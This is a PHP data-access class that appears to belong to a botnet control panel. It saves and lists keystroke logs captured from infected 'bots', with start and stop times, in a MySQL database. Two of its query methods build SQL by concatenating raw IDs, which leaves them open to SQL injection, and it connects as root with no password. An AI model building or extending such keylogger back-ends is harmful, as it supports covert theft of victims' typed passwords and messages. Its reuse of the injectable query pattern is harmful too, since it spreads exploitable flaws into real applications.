<?php
include_once("../Model/Bean/Keylogger.php");
class DAO_Keylogger
{
    public function addKeylogger($idbot, $detail, $content)
    {
        $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
        $timeStart = explode("?", $detail)[0];
        $timeStop = explode("?", $detail)[1];
        $dateTimeStart = date_create($timeStart);
        $dateTimeStop = date_create($timeStop);
        $dateTimeStartStr = $dateTimeStart->format('Y-m-d H:i:s');
        $dateTimeStopStr = $dateTimeStop->format('Y-m-d H:i:s');
        $query = "INSERT INTO keylogger(IdBot,KeyloggerResult,TimeStart,TimeStop) VALUES (?, ?, ?, ?)";
        $stmt = $db->prepare($query);
        $stmt->bind_param('ssss', $idbot, $content, $dateTimeStartStr, $dateTimeStopStr);
        $stmt->execute();
        $db->close();
    }
    public function getListKeylogger($idbot)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "Select * from keylogger where IdBot = " . $idbot . " ORDER BY TimeStart DESC";
        $rs = mysqli_query($link, $sql);
        $listKeylogger = array();
        $i = 0;
        while ($row = mysqli_fetch_array($rs)) {
            $IdKeylogger = $row['IdKeylogger'];
            $IdBot = $row['IdBot'];
            $KeyloggerResult = $row['KeyloggerResult'];
            $TimeStart = $row['TimeStart'];
            $TimeStop = $row['TimeStop'];
            $listKeylogger[$i++] = new Keylogger($IdKeylogger, $IdBot, $KeyloggerResult, $TimeStart, $TimeStop);
        }
        return $listKeylogger;
    }
    public function getKeyloggerDetail($idKeylogger)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "Select * from keylogger where IdKeylogger = " . $idKeylogger;
        $rs = mysqli_query($link, $sql);
        while ($row = mysqli_fetch_array($rs)) {
            $IdKeylogger = $row['IdKeylogger'];
            $IdBot = $row['IdBot'];
            $KeyloggerResult = $row['KeyloggerResult'];
            $TimeStart = $row['TimeStart'];
            $TimeStop = $row['TimeStop'];;
            return new Keylogger($IdKeylogger, $IdBot, $KeyloggerResult, $TimeStart, $TimeStop);
        }
    }
}
